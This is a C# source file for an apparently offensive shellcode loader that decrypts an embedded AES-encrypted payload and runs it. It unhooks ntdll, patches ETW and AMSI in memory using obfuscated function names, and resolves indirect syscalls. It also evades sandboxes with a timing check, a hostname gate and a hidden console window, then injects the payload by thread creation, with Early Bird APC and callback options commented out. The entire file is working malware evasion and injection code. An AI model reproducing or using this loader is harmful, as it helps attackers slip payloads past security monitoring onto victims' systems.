using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using static SharpV.Structs;

namespace SharpV
{

    class Program
    {


        private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {

            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                throw new InvalidOperationException("[!] Failed to parse module exports.");
            }
            return FunctionPtr;
        }


        public static bool CustomNtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
        {
            OldProtect = 0;
            object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
            IntPtr NTDLLHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
            IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, "NtProtectVirtualMemory");
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(Structs.NtProtectVirtualMemoryDelegate));
            UInt32 NTSTATUSResult = (UInt32)funcDelegate.DynamicInvoke(funcargs);
            if (NTSTATUSResult != 0x00000000)
            {
                return false;
            }
            OldProtect = (UInt32)funcargs[4];
            return true;
        }


        static IntPtr GetModuleBaseAddress(string name)
        {
            Process hProc = Process.GetCurrentProcess();
            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                    return m.BaseAddress;
            }
            return IntPtr.Zero;
        }


        static uint GetModuleSize(string module)
        {
            IntPtr addrMod = GetModuleBaseAddress(module);
            if (addrMod == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to get Module base address!");
                return 0;
            }
            IMAGE_DOS_HEADER dosHdr = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(addrMod, typeof(IMAGE_DOS_HEADER));
            if (!dosHdr.isValid)
            {
                Console.WriteLine("[!] Module is NOT a valid image!");
                return 0;
            }
            IntPtr pNtHeaders = addrMod + dosHdr.e_lfanew;
            IMAGE_NT_HEADERS64 ntHdrs = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS64));
            if (!ntHdrs.isValid)
            {
                Console.WriteLine("[!] Module NT Headers is NOT valid!");
                return 0;
            }
            uint modSize = ntHdrs.OptionalHeader.SizeOfImage;
            return modSize;
        }


        static int FindFirstSyscallOffset(byte[] pMem, int size, IntPtr moduleAddress)
        {
            int offset = 0;
            byte[] pattern1 = new byte[] { 0x0f, 0x05, 0xc3 };
            byte[] pattern2 = new byte[] { 0xcc, 0xcc, 0xcc };
            for (int i = 0; i < size - 3; i++)
            {
                byte[] instructions = new byte[3] { pMem[i], pMem[i + 1], pMem[i + 2] };
                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern1))
                {
                    offset = i;
                    break;
                }
            }
            for (int i = 3; i < 50; i++)
            {
                byte[] instructions = new byte[3] { pMem[offset - i], pMem[offset - i + 1], pMem[offset - i + 2] };
                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern2))
                {
                    offset = offset - i + 3;
                    break;
                }
            }
            IntPtr addr = IntPtr.Add(moduleAddress, offset);
            return offset;
        }


        static int FindLastSyscallOffset(byte[] pMem, int size, IntPtr moduleAddress)
        {
            int offset = 0;
            byte[] pattern = new byte[] { 0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc };
            for (int i = size - 9; i > 0; i--)
            {
                byte[] instructions = new byte[9] { pMem[i], pMem[i + 1], pMem[i + 2], pMem[i + 3], pMem[i + 4], pMem[i + 5], pMem[i + 6], pMem[i + 7], pMem[i + 8] };
                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern))
                {
                    offset = i + 6;
                    break;
                }
            }
            IntPtr addr = IntPtr.Add(moduleAddress, offset);
            return offset;
        }

        private static void PatchETW()
        {
            try
            {
                IntPtr CurrentProcessHandle = new IntPtr(-1); 
                IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
                byte[] patchbyte = new byte[0];
                if (IntPtr.Size == 4)
                {
                    string patchbytestring2 = "33,c0,c2,14,00";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                else
                {
                    string patchbytestring2 = "48,33,C0,C3";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                IntPtr funcPtr = GetExportAddress(libPtr, ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
                IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                UInt32 oldProtect = 0;
                CustomNtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                UInt32 newProtect = 0;
                CustomNtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] {0}", e.Message);
                Console.WriteLine("[!] {0}", e.InnerException);
            }
        }


        private static void PatchAMSI()
        {
            try
            {
                IntPtr CurrentProcessHandle = new IntPtr(-1); 
                byte[] patchbyte = new byte[0];
                if (IntPtr.Size == 4)
                {
                    string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                else
                {
                    string patchbytestring2 = "B8,57,00,07,80,C3";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                IntPtr libPtr;
                try
                {
                    libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="))).Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
                }
                catch
                {
                    libPtr = IntPtr.Zero;
                }
                if (libPtr != IntPtr.Zero)
                {
                    IntPtr funcPtr = GetExportAddress(libPtr, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
                    IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                    UInt32 oldProtect = 0;
                    CustomNtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                    Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                    UInt32 newProtect = 0;
                    CustomNtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] {0}", e.Message);
                Console.WriteLine("[!] {0}", e.InnerException);
            }
        }


        private static void PerunsFart()
        {
            Structs.STARTUPINFO si = new Structs.STARTUPINFO();
            Structs.PROCESS_INFORMATION pi = new Structs.PROCESS_INFORMATION();
            string app = @"C:\Windows\System32\svchost.exe";
            bool success = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
            uint modSize = GetModuleSize("ntdll");
            byte[] cleanModule = new byte[modSize];
            IntPtr dirtyModuleBaseAddress = GetModuleBaseAddress("ntdll");
            success = ReadProcessMemory(pi.hProcess, dirtyModuleBaseAddress, cleanModule, (int)modSize, out IntPtr lpNumberOfBytesRead);
            Process.GetProcessById(pi.dwProcessId).Kill();
            unsafe
            {
                fixed (byte* p = cleanModule)
                {
                    IntPtr ptr = (IntPtr)p;
                    IMAGE_DOS_HEADER dosHdr = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(ptr, typeof(IMAGE_DOS_HEADER));
                    IntPtr pNtHeaders = ptr + dosHdr.e_lfanew;
                    IMAGE_NT_HEADERS64 ntHdrs = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS64));
                    Int32 sizeOfNtHeader = (Marshal.SizeOf(ntHdrs.GetType()));
                    IntPtr pCurrentSection = pNtHeaders + sizeOfNtHeader;
                    IMAGE_SECTION_HEADER secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));
                    for (int i = 0; i < ntHdrs.FileHeader.NumberOfSections; i++)
                    {
                        if (secHdr.Section.StartsWith(".text"))
                        {
                            break;
                        }
                        Int32 sizeOfSection = (Marshal.SizeOf(secHdr.GetType()));
                        pCurrentSection += sizeOfSection;
                        secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));
                    }
                    int startOffset = FindFirstSyscallOffset(cleanModule, (Int32)secHdr.VirtualSize, dirtyModuleBaseAddress);
                    int endOffset = FindLastSyscallOffset(cleanModule, (Int32)secHdr.VirtualSize, dirtyModuleBaseAddress);
                    byte[] cleanSyscalls = new byte[endOffset - startOffset];
                    Buffer.BlockCopy(cleanModule, startOffset, cleanSyscalls, 0, endOffset - startOffset);
                    bool result = VirtualProtect(IntPtr.Add(dirtyModuleBaseAddress, startOffset), (UIntPtr)cleanSyscalls.Length, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out UInt32 lpflOldProtect);
                    try
                    {
                        Marshal.Copy(cleanSyscalls, 0, IntPtr.Add(dirtyModuleBaseAddress, startOffset), cleanSyscalls.Length);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Unable to copy mapped data! {0}", new string[] { ex.Message });
                    }
                    result = VirtualProtect(IntPtr.Add(dirtyModuleBaseAddress, (Int32)secHdr.VirtualSize), (UIntPtr)secHdr.VirtualSize, lpflOldProtect, out lpflOldProtect);
                }
            }
        }


        public static byte[] IndirectSyscallStub =
        {
            0x4C, 0x8B, 0xD1,
            0xB8, 0x18, 0x00, 0x00, 0x00,
            0x49, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x41, 0xFF, 0xE3
        };

        public static void FixStub(Int16 syscallId, IntPtr syscallAddr)
        {
            byte[] syscallNumberByte = BitConverter.GetBytes(syscallId);
            syscallNumberByte.CopyTo(IndirectSyscallStub, 4);
            long syscallAddressLong = (long)syscallAddr;
            byte[] syscallAddressByte = BitConverter.GetBytes(syscallAddressLong);
            syscallAddressByte.CopyTo(IndirectSyscallStub, 10);
            return;
        }

        public static bool CheckStubIntegrity(byte[] stub)
        {
            return (stub[0] == 0x4c && stub[1] == 0x8b && stub[2] == 0xd1 && stub[3] == 0xb8 && stub[6] == 0x00 && stub[7] == 0x00 && stub[18] == 0x0f && stub[19] == 0x05);
        }

        public static unsafe void Copy(IntPtr source, ref byte[] destination, int startIndex, int length)
        {
            byte* TargetByte = (byte*)(source.ToPointer());
            int sourceIndex = 0;
            for (int targetIndex = startIndex; targetIndex < (startIndex + length); targetIndex++)
            {
                destination[targetIndex] = *(TargetByte + sourceIndex);
                sourceIndex++;
            }
        }

        public static void GetSyscall(string fName)
        {
            IntPtr ModuleBase = GetModuleBaseAddress("ntdll");
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (fName == FunctionName)
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    IntPtr FunctionAddress = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    byte[] FunctionOpcode = new byte[24];
                    Copy(FunctionAddress, ref FunctionOpcode, 0, 24);
                    if (CheckStubIntegrity(FunctionOpcode))
                    {  
                        Int16 syscallId = (Int16)(((byte)FunctionOpcode[5] << 4) | (byte)FunctionOpcode[4]);
                        IntPtr syscallAddr = FunctionAddress + 0x12;
                        FixStub(syscallId, syscallAddr);
                        return;
                    }
                    else
                    {
                        for (int z = 1; z < 50; z++)
                        {
                            Copy((FunctionAddress + (-32 * z)), ref FunctionOpcode, 0, 24);
                            if (CheckStubIntegrity(FunctionOpcode))
                            {
                                Int16 syscallId = (Int16)(((byte)FunctionOpcode[5] << 4) | (byte)FunctionOpcode[4]);
                                IntPtr syscallAddr = FunctionAddress + 0x12;
                                FixStub(syscallId, syscallAddr);
                                return;
                            }
                        }
                        for (int z = 1; z < 50; z++)
                        {
                            Copy((FunctionAddress + (32 * z)), ref FunctionOpcode, 0, 24);
                            if (CheckStubIntegrity(FunctionOpcode))
                            {
                                Int16 syscallId = (Int16)(((byte)FunctionOpcode[5] << 4) | (byte)FunctionOpcode[4]);
                                IntPtr syscallAddr = FunctionAddress + 0x12;
                                FixStub(syscallId, syscallAddr);
                                return;
                            }
                        }
                    }
                }
            }
        }


        static byte[] DecryptXyz(byte[] passwordBytes, byte[] saltBytes, byte[] xyz)
        {
            byte[] decryptedString;

            RijndaelManaged rj = new RijndaelManaged();

            try
            {
                rj.KeySize = 256;
                rj.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                rj.Key = key.GetBytes(rj.KeySize / 8);
                rj.IV = key.GetBytes(rj.BlockSize / 8);
                rj.Mode = CipherMode.CBC;

                MemoryStream ms = new MemoryStream(xyz);

                using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.Read(xyz, 0, xyz.Length);
                    decryptedString = ms.ToArray();
                }
            }
            finally
            {
                rj.Clear();
            }

            return decryptedString;
        }


        public static void EarlyBird(byte[] buf)
        {
            Structs.STARTUPINFO si = new Structs.STARTUPINFO();
            Structs.PROCESS_INFORMATION pi = new Structs.PROCESS_INFORMATION();
            string app = @"C:\Windows\System32\svchost.exe";
            _ = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);
            IntPtr proc_handle = pi.hProcess;
            _ = VirtualProtectEx(proc_handle, resultPtr, (UIntPtr)buf.Length, PAGE_EXECUTE_READ, out uint oldProtect);
            IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);
        }


        public static void EnumExec(byte[] buf)
        {
            IntPtr addr = Structs.VirtualAlloc(IntPtr.Zero, buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            EnumPageFilesW(addr, IntPtr.Zero);
        }


        public static void indirect_thread_exec(byte[] buf)
        {
            GetSyscall("NtAllocateVirtualMemory");
            IntPtr CurrentProcessHandle = new IntPtr(-1);
            IntPtr pMemoryAllocation = new IntPtr();
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(buf.Length));
            uint allocationType = (uint)Structs.AllocationType.Commit | (uint)Structs.AllocationType.Reserve;
            uint protection = (uint)Structs.AllocationProtect.PAGE_EXECUTE_READWRITE;
            _ = IndirectNtAllocateVirtualMemory(CurrentProcessHandle, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
            Marshal.Copy(buf, 0, (IntPtr)(pMemoryAllocation), buf.Length);
            IntPtr hThread = new IntPtr(0);
            ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);
            GetSyscall("NtCreateThreadEx");
            _ = IndirectNtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, CurrentProcessHandle, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            GetSyscall("NtWaitForSingleObject");
            IndirectNtWaitForSingleObject(hThread, true, 0);
        }
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            string HostName = Dns.GetHostName();
            if (HostName != "Win102")
            {
                Console.WriteLine("Abort.");
            }

            else

            {


                byte[] passwordBytes = new byte[] { 182, 11, 151, 46, 168, 94, 61, 47, 205, 200, 156, 85, 143, 214, 10, 246, 112, 160, 193, 124, 195, 151, 212, 214, 53, 4, 110, 178, 139, 196, 133, 123, };
                byte[] saltBytes = new byte[] { 27, 136, 98, 14, 55, 108, 186, 200, 172, 207, 96, 8, 74, 17, 4, 124, 221, 8, 82, 171, 11, 205, 196, 217, 165, 46, 234, 190, 168, 195, 44, 251, };
                byte[] encryptedXyz = new byte[] { 242, 126, 4, 137, 118, 21, 19, 45, 248, 103, 110, 74, 237, 134, 202, 74, 191, 194, 111, 206, 115, 161, 56, 40, 236, 54, 104, 114, 141, 27, 222, 40, 43, 201, 233, 116, 26, 233, 64, 111, 83, 42, 201, 255, 175, 29, 235, 175, 138, 194, 84, 179, 191, 114, 15, 97, 138, 208, 177, 47, 37, 177, 252, 76, 244, 253, 169, 249, 136, 221, 141, 23, 3, 112, 206, 81, 45, 255, 29, 122, 68, 67, 69, 85, 68, 250, 167, 210, 232, 225, 247, 117, 14, 63, 105, 184, 219, 114, 187, 127, 5, 161, 191, 86, 4, 77, 166, 47, 7, 29, 239, 254, 44, 1, 199, 5, 75, 112, 155, 136, 58, 196, 235, 139, 159, 82, 106, 137, 22, 69, 167, 182, 182, 160, 37, 166, 0, 52, 115, 32, 102, 246, 114, 93, 215, 198, 235, 250, 105, 87, 42, 253, 194, 46, 180, 73, 63, 105, 150, 140, 172, 214, 131, 129, 94, 134, 77, 21, 100, 229, 230, 214, 29, 147, 136, 0, 153, 116, 87, 130, 235, 167, 110, 160, 89, 157, 108, 30, 164, 109, 86, 89, 52, 242, 30, 73, 62, 221, 110, 223, 130, 236, 0, 178, 90, 88, 221, 213, 128, 137, 194, 10, 222, 198, 238, 208, 225, 167, 61, 215, 101, 225, 146, 79, 229, 123, 22, 225, 188, 195, 50, 43, 69, 212, 207, 206, 242, 188, 133, 188, 193, 187, 168, 6, 205, 26, 125, 67, 87, 112, 154, 217, 134, 46, 87, 160, 178, 115, 221, 216, 231, 241, 194, 0, 229, 205, 168, 192, 14, 251, 48, 206, 101, 239, 101, 183, 135, 193, 93, 162, 11, 180, 82, 161, 35, 56, 41, 200, 78, 215, 172, 195, 231, 154, 145, 14, 90, 199, 70, 133, 53, 105, 3, 246, 200, 137, 23, 44, 50, 75, 51, 79, 56, 211, 135, 13, 216, 123, 77, 229, 185, 249, 61, 174, 198, 67, 196, 204, 12, 109, 78, 118, 244, 56, 34, 39, 170, 214, 119, 1, 30, 250, 41, 190, 20, 232, 138, 22, 79, 126, 39, 101, 140, 232, 169, 103, 35, 110, 126, 188, 108, 185, 129, 140, 112, 227, 171, 158, 42, 33, 208, 161, 132, 114, 58, 220, 73, 22, 207, 39, 159, 31, 156, 247, 71, 22, 108, 135, 48, 220, 14, 120, 32, 44, 205, 198, 179, 143, 87, 112, 6, 75, 150, 213, 238, 175, 130, 245, 34, 64, 216, 249, 84, 101, 194, 23, 56, 97, 52, 77, 185, 87, 34, 29, 46, 91, 111, 114, 95, 241, 106, 0, 121, 86, 130, 191, 220, 210, 132, 113, 227, 159, 133, 52, 72, 53, 157, 197, 162, 48, 75, 64, 35, 12, 163, 233, 173, 12, 22, 201, 4, 183, 165, 176, 14, 252, 105, 202, 77, 33, 169, 11, 18, 227, 142, 220, 2, 75, 67, 205, 247, 22, 140, 93, 186, 89, 213, 218, 23, 104, 88, 133, 22, 86, 175, 212, 83, 229, 152, 219, 145, 221, 242, 49, 161, 218, 147, 81, 191, 140, 156, 6, 0, 74, 18, 136, 116, 140, 114, 20, 62, 110, 26, 209, 176, 71, 54, 127, 126, 163, 236, 117, 148, 7, 159, 158, 239, 231, 212, 146, 156, 178, 167, 111, 195, 82, 24, 74, 3, 229, 231, 182, 66, 84, 77, 210, 61, 167, 24, 185, 162, 16, 199, 194, 9, 161, 247, 57, 10, 84, 45, 120, 142, 106, 41, 120, 235, 251, 163, 154, 208, 147, 64, 153, 80, 221, 75, 65, 25, 126, 33, 165, 231, 24, 47, 23, 22, 179, 219, 61, 179, 12, 56, 28, 137, 8, 132, 64, 59, 112, 147, 171, 113, 123, 219, 119, 130, 164, 140, 168, 26, 201, 11, 193, 85, 212, 58, 38, 102, 116, 181, 187, 133, 134, 86, 143, 95, 109, 44, 229, 246, 179, 98, 159, 105, 216, 171, 47, 71, 42, 208, 41, 213, 33, 29, 34, 4, 68, 48, 79, 249, 239, 189, 194, 50, 101, 33, 237, 128, 95, 156, 172, 125, 132, 87, 94, 125, 236, 214, 11, 9, 9, 213, 176, 250, 35, 253, 187, 150, 211, 253, 17, 219, 206, 80, 223, 61, 16, 107, 141, 225, 204, 119, 6, 125, 64, 41, 128, 154, 228, 76, 44, 58, 67, 4, 29, 185, 139, 205, 162, 23, 251, 45, 24, 85, 14, 233, 208, 178, 82, 188, 237, 61, 135, 57, 207, 230, 240, 223, 2, 232, 10, 162, 29, 5, 176, 103, 89, 251, 142, 185, 115, 126, 45, 242, 46, 81, 10, 66, 202, 131, 208, 68, 70, 4, 207, 233, 87, 14, 119, 198, 249, 240, 68, 169, 16, 138, 138, 158, 68, 133, 200, 102, 88, 238, 157, 85, 198, 131, 12, 211, 130, 168, 53, 172, 130, 156, 214, 128, 67, 103, 24, 119, 236, 109, 117, 209, 101, 64, 176, 215, 232, 63, 185, 116, 226, 95, 219, 30, 50, 252, 89, 89, 38, 250, 203, 79, 16, 17, 183, 126, 32, 147, 247, 170, 164, 157, 229, 225, 237, 72, 247, 245, 237, 110, 154, 120, 9, 77, 44, 8, 206, 114, 18, 58, 145, 117, 142, 153, 98, 172, 241, 32, 182, 168, 84, 202, 196, 245, 246, 145, 154, 38, 78, 199, 127, 78, 73, 54, 154, 250, 96, 17, 167, 216, 56, 124, 94, 159, 198, 185, 25, 235, 204, 3, 222, 212, 89, 80, 148, 214, 30, 239, 107, 132, 26, 210, 220, 38, 183, 174, 184, 29, 73, 69, 225, 65, 32, 3, 6, 25, 32, 217, 19, 35, 172, 45, 253, 96, 252, 139, 255, 129, 1, 8, 134, 247, 199, 147, 113, 68, 1, 34, 105, 100, 30, 180, 177, 154, 198, 63, 14, 227, 163, 1, 170, 91, 116, 97, 30, 168, 6, 149, 145, 38, 251, 198, 202, 255, 106, 191, 84, 52, 177, 89, 237, 160, 31, 203, 223, 237, 162, 222, 241, 2, 158, 11, 238, 238, 130, 183, 112, 122, 38, 194, 162, 60, 139, 142, 230, 37, 171, 172, 202, 12, 228, 182, 152, 19, 144, 42, 46, 27, 31, 147, 108, 254, 5, 250, 163, 245, 192, 198, 128, 217, 179, 194, 148, 210, 142, 48, 66, 57, 94, 151, 118, 16, 224, 183, 146, 247, 109, 116, 196, 26, 33, 174, 247, 93, 46, 45, 53, 112, 73, 122, 132, 144, 248, 1, 226, 131, 252, 5, 105, 242, 244, 232, 32, 192, 29, 205, 189, };
                byte[] xyz = DecryptXyz(passwordBytes, saltBytes, encryptedXyz);

                PerunsFart();

                PatchETW();
                PatchAMSI();

                indirect_thread_exec(xyz);
                //EnumExec(xyz);
                //EarlyBird(xyz);

                Console.ReadLine();
            }
        }
    }
}